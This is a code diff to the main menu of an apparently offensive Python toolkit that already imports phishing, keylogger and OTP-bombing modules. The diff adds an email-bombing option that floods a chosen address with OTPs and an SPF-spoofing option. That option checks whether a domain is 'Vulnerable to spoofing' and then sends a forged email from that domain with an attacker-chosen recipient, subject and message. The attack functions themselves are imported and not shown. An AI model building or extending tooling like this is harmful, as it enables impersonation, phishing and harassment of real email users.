@@ -30,13 +30,13 @@ from includes.menu import main_menu
 from includes import config_status
 from AttackModes import phishing
 from AttackModes import keylogger
+from AttackModes import spfattack
 from AttackModes import otpboming
+from AttackModes import emailboming
 from rich.console import Console
 from rich.panel import Panel
 import os
-import subprocess
-import threading
-import time
+
 
 from colorama import Fore, Style, init
 init(autoreset=True)
@@ -112,6 +112,65 @@ def main():
              elif selected == 'x':
                 print("Exiting...")
              
+        elif choice == 4:
+            banner.clear
+            banner.show_banner()
+            result = emailboming.getio()
+            if result:
+                emailid, otpcount = result
+                banner.clear
+                banner.show_banner()
+                emailboming.sendotp(emailid, otpcount)
+            else:
+                print("🔙 Returning to main menu...")
+        
+        elif choice == 5:
+            banner.clear
+            banner.show_banner()
+            result = spfattack.getio()
+            if result:
+                emailid = result
+                banner.clear
+                banner.show_banner()
+                spf = spfattack.check_spf(emailid)
+                if spf and spf == "Vulnerable to spoofing":
+                    console.print(Panel.fit(
+                        f"[bold green]✅ SPF Check Completed![/bold green]\n\n"
+                        f"👉 Email ID: {emailid}\n"
+                        f"👉 Status: {spf}\n"
+                        f"👉 Enter to Address to send Fake email: \n",
+                        border_style="magenta"
+                    ))
+                    to_email = spfattack.get_emailidto()
+                    if to_email == "exit":
+                        print("🔙 Returning to main menu...")
+                        continue
+                    subject = input("📧 Enter Subject: ").strip() 
+                    msg = input("📧 Enter Message to send: ").strip()    
+                    status = spfattack.send_spoofed_email(emailid, to_email, subject, msg) 
+                    message = status.get("message")
+                    if status and message == "Email sent successfully":
+                        banner.clear
+                        
+                        banner.show_banner()
+                        console.print(Panel.fit(
+                            f"[bold green]✅ Email sent successfully![/bold green]\n\n"
+                            f"👉 From: {emailid}\n"
+                            f"👉 To: {to_email}\n"
+                            f"👉 Subject: {subject}\n"
+                            f"👉 Message: {msg}\n",
+                            border_style="magenta"
+                        ))
+                        input("🔙 Press Enter to return to the main menu...")
+                    else :
+                        console.print(f"[bold red]❌ {message}.[/bold red]")
+                        input("🔙 Press Enter to return to the main menu...")
+                   
+                else:
+                    console.print("[bold red]❌ Failed to check SPF record or Not Vulnerable.[/bold red]")
+                    input("🔙 Returning to main menu...")
+            else:
+                print("🔙 Returning to main menu...")
 
         else:
             banner.not_implemented()
